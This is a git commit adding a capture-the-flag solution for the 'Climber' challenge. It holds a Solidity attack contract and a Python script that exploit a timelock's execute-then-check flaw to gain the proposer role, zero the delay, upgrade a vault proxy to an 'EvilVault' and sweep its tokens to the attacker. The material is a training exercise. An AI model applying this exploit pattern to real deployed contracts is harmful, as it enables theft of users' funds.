c25d9b62d1e4651f287f7fd027853a1f89f46369
dtr0x <dylantroop@gmail.com>
2022-09-21 12:15:46 -0400

    Challenge 12: Climber

---
+++ contracts/climber/ClimberAttack.sol
@@ -0,0 +1,66 @@
+pragma solidity ^0.8.0;
+
+import './ClimberTimelock.sol';
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+contract TimelockAttack {
+
+    function becomeProposer(address timelock) public {
+        address[] memory targets = new address[](3);
+        uint256[] memory values = new uint256[](3);
+        bytes[] memory data = new bytes[](3);
+        bytes32 salt = 0;
+
+        targets[0] = timelock;
+        targets[1] = timelock;
+        targets[2] = address(this);
+
+        values[0] = 0;
+        values[1] = 0;
+        values[2] = 0;
+
+        ClimberTimelock timelockContract = ClimberTimelock(payable(timelock));
+
+        data[0] = abi.encodeWithSelector(
+            ClimberTimelock.updateDelay.selector, 0);
+
+        data[1] = abi.encodeWithSignature(
+            "grantRole(bytes32,address)",
+            timelockContract.PROPOSER_ROLE(), address(this));
+
+        data[2] = abi.encodeWithSignature(
+            "becomeProposer(address)", timelock);
+
+        timelockContract.schedule(targets, values, data, salt);
+    }
+
+    function upgrade(address timelock, address vault, address evilVault) public {
+        address[] memory targets = new address[](1);
+        uint256[] memory values = new uint256[](1);
+        bytes[] memory data = new bytes[](1);
+        bytes32 salt = 0;
+
+        targets[0] = vault;
+        values[0] = 0;
+        data[0] = abi.encodeWithSignature("upgradeTo(address)", evilVault);
+
+        ClimberTimelock timelockContract = ClimberTimelock(payable(timelock));
+
+        timelockContract.schedule(targets, values, data, salt);
+        timelockContract.execute(targets, values, data, salt);
+    }
+
+}
+
+contract EvilVault {
+
+    // ERC1967UpgradeUpgradeable._upgradeToAndCallUUPS checks for this
+    bytes32 public proxiableUUID = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+    function sweepFunds(address tokenAddress) external {
+        IERC20 token = IERC20(tokenAddress);
+        require(token.transfer(msg.sender, token.balanceOf(address(this))),
+                "Transfer failed");
+    }
+
+}
--- scripts/Climber.py
+++ scripts/Climber.py
@@ -24,9 +24,33 @@ def main():
     assert vault.owner() != ZERO_ADDRESS
     assert vault.owner() != deployer.address
 
-    return vault
-    # Exploit code here
-    # Success conditions
+    timelock = ClimberTimelock.at(vault.owner())
 
+    assert timelock.hasRole(timelock.PROPOSER_ROLE(), proposer)
+    assert timelock.hasRole(timelock.ADMIN_ROLE(), deployer)
+
+    token = DamnValuableToken.deploy({'from': deployer})
+    token.transfer(vault, VAULT_TOKEN_BALANCE)
+
+    # Exploit code here
+    # attack contract gains proposer role
+    attack = TimelockAttack.deploy({'from': attacker})
+    targets = [timelock, timelock, attack]
+    values = [0, 0, 0]
+    salt = 0
+    data = []
+    data.append(timelock.updateDelay.encode_input(0))
+    data.append(
+        timelock.grantRole.encode_input(timelock.PROPOSER_ROLE(), attack))
+    data.append(attack.becomeProposer.encode_input(timelock))
+    timelock.execute(targets, values, data, salt, {'from': attacker})
+    # upgrade the contract and sweep the funds
+    evilVault = EvilVault.deploy({'from': attacker})
+    attack.upgrade(timelock, vault, evilVault, {'from': attacker})
+    vault.sweepFunds(token, {'from': attacker})
+
+    # Success conditions
     print('Challenge successfully passed.')
+    assert token.balanceOf(vault) == 0
+    assert token.balanceOf(attacker) == VAULT_TOKEN_BALANCE
 
